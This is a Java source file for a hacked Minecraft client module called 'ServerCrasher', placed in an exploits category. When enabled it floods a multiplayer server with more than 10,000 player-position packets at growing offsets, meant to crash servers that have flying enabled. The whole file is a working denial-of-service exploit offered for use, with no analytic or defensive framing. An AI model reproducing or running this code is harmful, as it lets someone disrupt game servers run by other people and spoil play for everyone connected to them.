package me.robbanrobbin.jigsaw.client.modules;

import org.lwjgl.input.Keyboard;

import me.robbanrobbin.jigsaw.client.module.state.Category;
import me.robbanrobbin.jigsaw.module.Module;
import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.entity.Entity;
import net.minecraft.network.AbstractPacket;
import net.minecraft.network.play.client.C02PacketUseEntity;
import net.minecraft.network.play.client.C02PacketUseEntity.Action;
import net.minecraft.network.play.client.C03PacketPlayer;

public class ServerCrasher extends Module {

	public ServerCrasher() {
		super("ServerCrasher", Keyboard.KEY_NONE, Category.EXPLOITS, "Crashes servers with flying enabled!");
	}

	@Override
	public void onDisable() {

		super.onDisable();
	}

	@Override
	public void onEnable() {
		
		super.onEnable();
	}

	@Override
	public void onUpdate() {
		if (mc.isSingleplayer()) {
			this.setToggled(false, true);
			return;
		}
		double playerX = mc.thePlayer.posX;
		double playerY = mc.thePlayer.posY;
		double playerZ = mc.thePlayer.posZ;
		double y = 0;
		double x = 0;
		double z = 0;
		for(int i = 0; i < 200;) {
			y = i * 9;
			sendPacketFinal(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y, playerZ, false));
			i++;
		}
		for(int i = 0; i < 10000;) {
			z = i * 9;
			sendPacketFinal(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y, playerZ + z, false));
			i++;
		}
		this.setToggled(false, true);
		super.onUpdate();
	}

}
